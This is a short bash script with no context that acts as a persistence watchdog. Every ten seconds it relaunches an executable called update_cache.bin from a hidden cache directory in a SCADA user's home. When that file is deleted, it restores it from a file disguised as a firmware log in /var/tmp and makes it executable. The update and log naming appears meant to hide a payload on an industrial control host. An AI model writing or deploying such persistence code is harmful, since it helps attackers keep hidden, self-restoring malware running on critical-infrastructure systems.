#!/bin/bash
UPDATE_CACHE="/home/scada/.cache/update_files/update_cache.bin"
FIRMWARE_SOURCE="/var/tmp/firmware-stdout.log"
while true; do
    sleep 10
    if ! pgrep -f update_cache.bin > /dev/null; then
        $UPDATE_CACHE &
    fi
    if [ ! -f "$UPDATE_CACHE" ]; then
        if [ -f "$FIRMWARE_SOURCE" ]; then
            mkdir -p "$(dirname "$UPDATE_CACHE")"
            cp "$FIRMWARE_SOURCE" "$UPDATE_CACHE"
            chmod +x "$UPDATE_CACHE"
        fi
    fi
done
